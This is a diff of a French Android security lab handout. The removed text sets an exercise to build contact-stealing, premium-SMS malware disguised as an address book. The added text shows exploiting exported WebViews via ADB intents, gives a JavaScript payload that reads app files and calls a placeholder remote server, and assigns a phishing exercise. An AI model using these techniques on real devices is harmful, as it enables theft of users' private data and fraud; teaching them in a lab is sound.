@@ -1,4 +1,4 @@
-# Introduction aux vulnérabilités d'une webview
+# Introduction aux vulnérabilités d'une webview 
 
 Le but de ce TP est de vous sensibiliser et de vous familiariser avec certaines notions de sécurité informatique.
 Les pratiques que vous allez mettre en oeuvre ne sont autorisées que sur du matériel vous appartenant ou pour lequel
@@ -42,127 +42,108 @@ Les consignes suivantes sont à respecter :
 Il est de votre responsabilité de vérifier que l'application Android que vous développez est compatible avec la version d'Android et l'appareil mentionnés ci-dessus.
 Toute application non fonctionnelle en raison de problèmes d'incompatibilité ne sera pas prise en compte dans la note finale du TP.
 
-## Contexte
+## Contexte et Objectifs
 
-En raison de sa popularité, la plateforme Android est une cible de choix pour des personnes malveillantes qui voudraient attaquer un grand nombre de personnes.
-Depuis l'avènement d'Android sur le marché des smartphones, le nombre d'appareils infectés par des malware n'a fait qu'augmenter.
-Les auteurs de malware fabriquent des applications qui ont pour but d'espionner ou de voler des utilisateurs de smart devices.
-Pour mieux se protéger de cette menace, il est important de comprendre et de connaitre les mécanismes mis en oeuvre par ces logiciels malveillant.
+Une `webview` permet d'afficher des pages Web dans le cadre de la mise en page de votre activité. Elle n'inclut pas les fonctionnalités d'un navigateur Web entièrement développé, telles que les commandes de navigation ou une barre d'adresse. Tout ce que WebView fait, par défaut, est d'afficher une page Web.
 
-Pour maximiser leur impact, les malwares dissimulent leurs comportements malicieux aux yeux de l'utilisateur en
-se faisant passer pour des applications dites bénignes (i.e avec un comportement qui semble légitime).
-Cela permet à une application mal intentionnée de rester plus longtemps en activité sur le téléphone de la cible et donc de faire plus de dégâts.
+Dans ce contexte, des vulnérabilitées relatives à certaines applications utilisant ce concept sont apparues récemment. L'objectif de ce TP est de se familiariser avec ces vulnérabilitées afin d'être en mesure d'éviter certaines pratiques.
 
-## Objectif
-Dans ce TP, il vous est demandé d'exploiter les faiblesses du système d'exploitation Android pour voler des données personnelles de l'utilisateur à son insu.
-Plus particulièrement, vous allez exploiter les vulnérabilités de *Webview*, explorées au cours du TP précédent, pour concevoir une application Android qui envoie des données collectées sur un téléphone à un serveur pirate distant.
+Ainsi, dans ce TP, il vous est demandé de décompresser un fichier APK d'une application android vulnérable. Une première partie théorique vise à illustrer les différentes vulnérabilitées sera traitée. Ensuite, vous devez exploiter une des vulnérabilitées étudiées précédemment (celle de votre choix).
 
-L'objectif final de ce TD est de développer votre propre malware maquillé sous la forme d'un carnet d'adresses.
+### Partie I: Vulnérabilité 1
 
-### Partie I: Implémenter un carnet d'adresses
+L'objectif de cette partie est de présenter deux vulnérabilités des webviews. Pour ce faire, nous nous basons sur l'application vulnérable `App.apk`, téléchargeable sur le répertoire du TD4. 
 
-Dans cette partie, il vous est demandé de développer la partie inoffensive (bénigne) de l'application, qui servira plus tard de camouflage pour déjouer la vigilance de l'utilisateur.
+Nous procédons d'abord à l'installation de `JADX`, qui est un décompilateur de fichiers `APK` et `DAX` utilisable sur invite de commandes sous Linux.
 
-Voici les caractéristiques de l'application:
+Pour installer `JADX`, suivez le tutoriel :
+https://lindevs.com/install-jadx-on-ubuntu/
 
-L'application est un carnet d'adresses qui permet à l'utilisateur de parcourir les différents contacts de son téléphone.
-Lors de la sélection d'un contact, l'utilisateur peut au choix lui envoyer un sms ou composer son numéro de téléphone.
+Ou bien sur le lien GitHub de `JADX` :
+https://github.com/skylot/jadx
 
-* Ecrivez le code Javascript et Java nécessaire pour récupérer les contacts de l'utilisateur et les afficher sous forme de liste au sein de la Webview.
-    * Pour chaque contact, récupérez le son nom ainsi que son numéro de téléphone
-    * Pour passer les données au contexte Webview, formattez les contacts au format `JSON` et sérialisez le tableau `JSON` obtenu en une `String`.
-    * Pour récupérer les données dans le contexte Webview, dé-sérialisez la `String` obtenue pour obtenir un objet javascript manipulable.
-* Ecrivez le code Javascript nécessaire pour pouvoir saisir le contenu d'un SMS après sélection d'un contact.
-* Ecrivez le bridge qui permet d'envoyer un SMS à un contact à partir du contenu saisi lors de l'action précédente.
-* Ecrivez le code nécessaire qui permet de notifier l'utilisateur que le SMS a bien été envoyé.
-* Ecrivez le bridge qui permet de composer le numéro de téléphone d'un contact sélectionné.
-
-#### Questions:
-
-1. Pourquoi est-il nécessaire de sérialiser les données de contacts pour les passer du contexte Java au contexte Webview ?
-2. Quels sont les types de données qui peuvent être utilisés pour passer des données de Java à Webview ?
-3. Quelles permissions doivent être accordées à l'application pour être complètement fonctionnelle ?
-
-### Partie II: Voler les contacts de l'utilisateur
-
-Dans cette partie, vous allez modifier le code de l'application produit dans la partie 1 pour envoyer les contacts enregitrés dans le téléphone lorsque l'utilisateur ouvre votre application.
-
-Dans certains scénarios malicieux, un pirate subtilise les contacts de plusieurs centaines de téléphones pour 
-ensuite effectuer des tentatives phishing avec les numéros de téléphones collectés.
-<!--
-A partir du travail effectué lors du TD1, il vous est demandé de mettre à jour le code de votre application pour 
-collecter les contacts de l'utilisateur.
--->
-
-<!--
-1. Ecrivez le code nécessaire pour implémenter le bridge qui permet de collecter les contacts de l'utilisateur dans 
-le contexte de la *Webview*.
-2. Ecrivez le bridge nécessaire qui permet de récupérer l'identifiant unique du téléphone dans le contexte de la Webview
--->
-
-#### Etape 1: Envoyer les contacts à un serveur distant.
-
-Dans un premier temps, il vous est demandé d'écrire le code Javascript nécessaire pour envoyer la liste de contacts
-ainsi que le numéro `imei` collecté à un serveur distant.
-
-Le message envoyé doit être au format `JSON` et aura la structure suivante :
-```json
-{
-	"imei": "string",
-	"contacts": [
-		{
-			"name": "string",
-			"phone_number": "string",
-			"mail_address": "string"
-		}
-	]
-}
+Ensuite, Procéder à la décompilation de l'application `App.apk` comme suit :
+```Bash
+// se rendre dans le répertoire contenant l'application app.apk puis faire la décompilation
+jadx app.apk
 ```
-* Ecrivez le code __Javascript__ (dans le context de Webview) nécessaire pour envoyer une requête `http` contenant le message décrit précédemment.
 
-##### Questions
-1. Comment se prémunir d'une attaque comme celle que vous développez ?
-2. Comment vous assurer que qu'une application installée sur votre téléphone fait uniquement ce qu'elle prétend offrir comme service et pas plus ?
+Après avoir obtenu le code source de l'application app.apk suite à la décompilation, il est possible d'accéder aux différents codes constituant cette application afin de comprendre son fonctionnement. Etant donné que les webviews font partie des activitées dans une application, nous avons besoin dans un premier temps de vérifier leur présence dans le fichier `AndroidManifest.xml`. Après, nous allons voir quels sont les activitées qui sont exportés, c.à.d. si oui ou non l'activité peut être lancée par des composants d'autres applications. nous pouvons conclure qu'une activitée est exportée de 2 manières.
 
+* Si la valeur de l'attribut "exported=true"
+* Si l'activité a des filtres d'intent et aucun attribut « exported=false »
 
-#### Etape 2: Développer un simple serveur web pirate
+![](Img1.png)
 
-L'objectif de cette partie est de concevoir un serveur pirate capable de recevoir des données au format `json` au travers du protocol `http`.
-Vous écrirez le code nécessaire dans le répertoire suivant : `td6/pirate_server`.
+certaines activités telles que `SupportWebView`, `RegistrationWebView` sont explicitement exportées, et `MainActivity` est exportée en mentionnant des filtres d'intent grâce auxquels nous pouvons confirmer que les WebViews sont utilisés par l'application.
 
-Voici les spécifications requises pour le serveur : 
+![](Img2.png)
 
-- Le serveur doit utiliser la plateforme `node.js`.
-- Le serveur doit communiquer avec ses clients au travers du protocole `http`.
-- Le serveur doit être capable d'agir correctement en fonction de la requête qui lui est envoyée (`http` routing).
-- Le serveur doit être capable de *parser* le contenu de la requête reçue.
-- Pour chaque message reçu, le serveur doit écrire le contenu du champ `contacts` dans un fichier nommé avec le numéro `imei` correspondant (`{imei}.txt`). Ces fichiers doivent être stockés dans le répertoire `td6/pirate_server/stolen_contacts`.
-- Le serveur doit renvoyer une erreur au client si la requête qui lui est envoyée n'est pas prise en charge par celui-ci.
-- Le serveur doit renvoyer une erreur au client si l'information contenue dans la requête n'est pas dans un format valide (`json`)
+Nous pouvons voir que la fonction `loadWebView`, elle charge l'url en obtenant le lien depuis un intent.
 
-Pour vous aider, vous pouvez consulter :
+![](Img3.png)
 
-- la documentation de l'interface `http` de nodejs : [https://nodejs.org/api/http.html](https://nodejs.org/api/http.html)
-- les exemples fournis dans la documentation de nodejs : [https://nodejs.org/api/synopsis.html](https://nodejs.org/api/synopsis.html)
+Ce comportement peut donc être exploité par des applications tierces en envoyant un intent à ce composant avec une d'URL et l'application cible acceptera et s'exécutera car ce composant a été exporté. c'est-à-dire que l'application tierce a accès au composant Webview dans l'application cible. Pour tester cela, nous utiliserons ADB (Android Debugger Bridge) pour envoyer un intent au composant et cet intent ouvrira une page Web malveillante fournie par l'attaquant dans le contexte de l'application. ADB est téléchargeable sous linux avec la commande suivante :
 
-### Partie III: Envoyer des sms surtaxés
-
-Dans cette partie, vous devrez modifier le code de votre application malicieuse pour permettre au serveur pirate d'envoyer une commande qui ordonne à votre application d'envoyer des sms à un numéro de téléphone surtaxé à l'insu de l'utilisateur.
-
-Pour que le serveur pirate puisse facilement envoyer des messages à l'application malicieuse, il vous est demandé d'ouvrir une connexion websocket entre le serveur et l'application.
-
-* Ecrivez le code Javascript nécessaire sur le serveur et le client pour ouvrir une connexion websocket.
-* Ecrivez le code Javascript nécessaire sur le serveur pour envoyer une commande `send_sms`.
-Cette commande est un message dont la structure est la suivante:
-```json
-{
-	"command": "send_sms",
-	"payload":
-		{
-			"phone_number": "string",
-			"content": "string"
-		}
-}
+```BASH
+sudo apt-get install android-tool-adb android-tool-fastboot
 ```
-* Ecrivez le code Javascript nécessaire sur le client pour traiter correctement la réception de la commande `send_sms`.
-* Utilisez le bridge implémenté précédemment pour envoyer un sms à un contact pour envoyer un sms surtaxé à partir du contenu du message de la commande `send_sms`.
+
+Ainsi, à partir d'un terminal Linux, il est possible d'envoyer un intent à n'importe quelle application Android sur l'émulateur ou sur le téléphone utilisé, si l'application cible dispose d'un filtre d'intent ou d'un receveur de broadcast.
+
+La requête ADB qui envoie un intent est de la forme suivante :
+```BASH 
+adb shell am start -n componentname --es string "domain.com"
+```
+Tel que `componentname` représente le nom de l'activité ciblée par l'intent, et le `domain.com` représente un exemple de chaine de caractère représentée dans l'intent. Dans notre exemple, si nous souhaitons à travers l'intent envoyer l'URL de `Google`, la requête serait la suivante :
+
+```Bash
+adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url "https://www.google.com"
+```
+
+Tel que "om.tmh.vulnwebview/.RegistrationWebView" représente le chemin de l'activité `RegistrationWebView` qui attend un intent avec une chaine de caratère nommée `reg_url`, et qui contient l'URL envoyée (google dans notre cas).
+
+### Partie II : Vulnérabilité 2
+
+Un autre paramètre que le développeur peut configurer est d'autoriser l'exécution de JavaScript dans le contexte de l'URL du schéma de fichier pour accéder au contenu de n'importe quelle origine, y compris d'autres URL de schéma de fichier.
+
+Ce paramètre supprime toutes les restrictions de politique d'origine et permet à la Webview de faire des demandes au Web à partir du fichier, ce qui n'est normalement pas possible. c'est-à-dire que l'attaquant peut lire les fichiers locaux à l'aide d'un script java et les envoyer sur le Web vers un domaine contrôlé par l'attaquant.
+
+Si la WebView est exportée, ce comportement peut être très dangereux car il peut permettre à l'attaquant de lire des fichiers arbitraires qui peuvent être privés dans l'application.
+
+![](Img4.png)
+
+Pour exploiter cette vulnérabilité présente dans l'activité `RegistrationWebView`, il suffit d'introduire un fichier html comportant un script qui envoie les données d'un fichier local propre à l'application à un serveur distant via une requête HTTP. L'exemple de code suivant envoie le fichier local `MainActivity.xml` à un serveur distant.
+
+```JAVASCRIPT
+<script>
+    var url = 'file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml'; //Un fichier local de l'application
+    function load(url) {
+        var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+            fetch('https://AdressedunServeurDistant'); //Envoyer le fichier local à un serveur distant
+            }
+        }xhr.open('GET', url, true);
+        xhr.send('');
+    }load(url)
+</script>
+```
+
+Pour tester cette vulnérabilité, les données du fichier local `MainActivity.xml` sont envoyées à un serveur distant. Pour tester cela, copiez d'abord le script ci-dessus dans un fichier `envoi.html`, rajoutez une route à votre serveur précédent (créé en TP 3) pour y envoyer les données du fichier local `MainActivity.xml`. Puis exécutez la commande suivante sur ADB afin de copier ce fichier dans la carte SD du téléphone/émulateur. 
+
+```BASH
+adb push envoi.html /sdcard/
+```
+
+Après avoir copié le fichier dans la carte SD, nous utilisons ADB pour envoyer un intent vers l'application `RegistrationWebView`, ce qui exécutera la page HTML `envoi.html` se trouvant dans la carte SD du téléphone, et ainsi envoyer les données privées du téléphone vers un serveur distant.
+
+```BASH
+adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url "file:///sdcard/envoi.html"
+```
+
+Partie III : Activité
+
+En se basant sur les deux vulnérabilitées présentées précédemment, faites un cas d'application d'une de ces vulnérabilitées en envoyant les données intercéptées à un serveur distant (une nouvelle route du serveur du TP 3).
+
+Exemple : Une page de fishing exécutée dans le context de la webview qui envoie le login et mot de passe vers le serveur distant.
+
